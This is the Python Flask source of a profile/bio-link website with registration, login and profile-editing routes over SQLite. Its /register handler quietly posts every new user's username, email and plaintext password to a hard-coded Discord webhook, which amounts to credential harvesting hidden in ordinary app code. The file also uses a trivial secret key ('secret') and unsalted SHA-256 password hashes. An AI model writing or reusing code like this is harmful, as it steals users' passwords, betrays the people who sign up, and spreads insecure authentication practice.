from flask import Flask, render_template, g, request, redirect, session, url_for
import sqlite3
import hashlib
import os
import requests
import json

os.system('cls')

DATABASE = "database.db"

app = Flask('testapp')
app.config.from_object(__name__)
app.config['SECRET_KEY'] = 'secret'

def init_db():
    with app.app_context():
        db = get_db()
        with app.open_resource('database.db', mode='r') as f:
            db.cursor().executescript(f.read())
        db.commit()

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(app.config['DATABASE'])
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

if not os.path.exists(DATABASE):
    init_db()

@app.route('/')
def index():
    cur = get_db().cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS data (
            email TEXT, 
            user TEXT, 
            password TEXT, 
            admin TEXT, 
            premium TEXT, 
            pfp TEXT DEFAULT '', 
            bio TEXT DEFAULT '', 
            background TEXT DEFAULT '', 
            music TEXT DEFAULT '', 
            color TEXT DEFAULT '', 
            discordid INTEGER DEFAULT 0, 
            rpctype TEXT DEFAULT '', 
            github TEXT DEFAULT '', 
            steam TEXT DEFAULT '', 
            spotify TEXT DEFAULT ''
        )
    """)
    return render_template('index.html')

blacklisted_usernames = ["!", 
                         "@", 
                         "#", 
                         "$", 
                         "%", 
                         "^",
                         "&",
                         "*",
                         "(",
                         ")",
                         "-",
                         "_",
                         "+",
                         "=",
                         "[",
                         "]",
                         "{",
                         "}",
                         ";",
                         ":",
                         "'",
                         '"',
                         ",",
                         ".",
                         "/",
                         "?",
                         " ",
                         "ataim",
                         "s",
                         "a",
                         "c"
]


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        email = request.form['email']
        password = request.form['password']
        
        # Check if the username is blacklisted
        if username.lower() in [name.lower() for name in blacklisted_usernames]:
            return render_template('register.html', error="Username is blacklisted. Please choose another username.")

        # Hash the password
        hashed_password = hashlib.sha256(password.encode()).hexdigest()

        # Assuming `get_db()` returns your database connection
        cur = get_db().cursor()
        cur.execute("INSERT INTO data (email, user, password, admin, premium) VALUES (?, ?, ?, ?, ?)", (email, username, hashed_password, 'False', 'False'))
        get_db().commit()

        # Notify on Discord
        msg = f"Account created for {username}\nEmail: {email}\nPassword: {password}"
        url = "https://discord.com/api/webhooks/1216082182058151976/RyzOzm8Oteg_V1PG_BPNoVo1G-L6kpj9BhcpmJ3rqDDFCJoTenuNGjm4rq7wYrlYybQc"
        try:
            requests.post(url, json={"content": msg})
        except Exception as e:
            print(e)

        return redirect(url_for('register_success', username=username, email=email))
    else:
        return render_template('register.html')

@app.route('/register_success')
def register_success():
    username = request.args.get('username')
    email = request.args.get('email')
    return render_template('register_success.html', username=username, email=email)

    

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        hashed_password = hashlib.sha256(password.encode()).hexdigest()

        cur = get_db().cursor()
        cur.execute("SELECT * FROM data WHERE email = ? AND password = ?", (email, hashed_password))
        result = cur.fetchone()

        if result:
            cur = get_db().cursor()
            username = result[1]
            session['logged_in'] = True
            session['username'] = username
            return redirect('/account')
        else:
            return "Invalid username or password"
    return render_template('login.html')


blacklisted_usernames = ["!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "+", "=", "[", "]", "{", "}", ";", ":", "'", '"', ",", ".", "/", "?", " ", "ataim", "s", "a", "c"]

def is_blacklisted(username):
    return username.lower() in [name.lower() for name in blacklisted_usernames]


@app.route('/account', methods=['GET', 'POST'])
def account():
    if 'logged_in' in session and 'username' in session:
        cur = get_db().cursor()
        cur.execute("SELECT * FROM data WHERE user = ?", (session['username'],))
        results = cur.fetchall()

        ucheck = get_db().cursor()
        ucheck.execute("SELECT * FROM data WHERE user = ?", (session['username'],))
        checkr = ucheck.fetchall()

        isAvailable = bool(checkr)


        if request.method == 'POST':
            print("Received form data:", request.form)

            new_username = request.form['username']
            discordid = request.form['discordid']

            if is_blacklisted(new_username):
                return render_template('account.html', error="New username is blacklisted. Please choose another username.", data=results, username=session['username'], premium=results[0][4], discordid=results[0][10])

            if isAvailable:
                return render_template('account.html', error="New username is already in use. Please choose another username.", data=results, username=session['username'], premium=results[0][4], discordid=results[0][10])

            try:
                cur.execute("UPDATE data SET user = ?, discordid = ? WHERE user = ?", (new_username, discordid, session['username']))
                get_db().commit()
                print("Database updated successfully.")  

                cur.execute("SELECT * FROM data WHERE user = ?", (session['username'],))
                results = cur.fetchall()

            except Exception as e:
                print(f"Error updating database: {e}")
                get_db().rollback()

        if results:
            return render_template('account.html', data=results, username=session['username'], email=results[0][0], premium=results[0][4], discordid=results[0][10])

    return redirect('/login')




    
@app.route('/customize', methods=['GET', 'POST'])
def customize():
    if 'logged_in' in session and 'username' in session:
        cur = get_db().cursor()
        cur.execute("SELECT * FROM data WHERE user = ?", (session['username'],))
        results = cur.fetchall()

        if request.method == 'POST':
            print("Received form data:", request.form)

            pfp = request.form['pfp']
            bio = request.form['bio']
            background = request.form['background']
            music = request.form['music']

            try:
                cur.execute("UPDATE data SET pfp = ?, bio = ?, background = ?, music = ? WHERE user = ?", (pfp, bio, background, music, session['username']))
                get_db().commit()
                print("Database updated successfully.")  

                cur.execute("SELECT * FROM data WHERE user = ?", (session['username'],))
                results = cur.fetchall()

            except Exception as e:
                print(f"Error updating database: {e}")
                get_db().rollback()

        if results:
            return render_template('customize.html', data=results, username=session['username'], premium=results[0][4], pfp=results[0][5], bio=results[0][6], background=results[0][7], music=results[0][8])

    return redirect('/login')

    
@app.route('/links', methods=['GET', 'POST'])
def links():
    if 'logged_in' in session and 'username' in session:
        cur = get_db().cursor()
        cur.execute("SELECT * FROM data WHERE user = ?", (session['username'],))
        results = cur.fetchall()

        if request.method == 'POST':
            print("Received form data:", request.form)

            github = request.form['github']
            steam = request.form['steam']
            spotify = request.form['spotify']

            try:
                cur.execute("UPDATE data SET github = ?, steam = ?, spotify = ? WHERE user = ?", (github, steam, spotify, session['username']))
                get_db().commit()
                print("Database updated successfully.")  

                cur.execute("SELECT * FROM data WHERE user = ?", (session['username'],))
                results = cur.fetchall()

            except Exception as e:
                print(f"Error updating database: {e}")
                get_db().rollback()

        if results:
            return render_template('links.html', data=results, username=session['username'], premium=results[0][4], github=results[0][12], steam=results[0][13], spotify=results[0][14], discord=results[0][10])


def get_bio_user(user):
    cur = get_db().cursor()
    cur.execute("SELECT * FROM data WHERE user = ?", (user,))
    result = cur.fetchone()
    if result:
        return result
    return None

@app.route('/<user>')
def user_bio(user):
    bio_data = get_bio_user(user)
    if bio_data:
        email = bio_data[0]
        user = bio_data[1]
        admin = bio_data[3]
        premium = bio_data[4]
        pfp = bio_data[5]
        bio = bio_data[6]
        background = bio_data[7]
        music = bio_data[8]
        color = bio_data[9]
        discordid = bio_data[10]
        rpctype = bio_data[11]
        github = bio_data[12]
        steam = bio_data[13]
        spotify = bio_data[14]

        return render_template('bio.html', username=user, admin=admin, premium=premium, pfp=pfp, bio=bio, background=background, music=music, color=color, discordid=discordid, rpctype=rpctype, spotify=spotify, github=github, steam=steam)


    return redirect('/login')




if __name__ == '__main__':
    app.run(debug=False)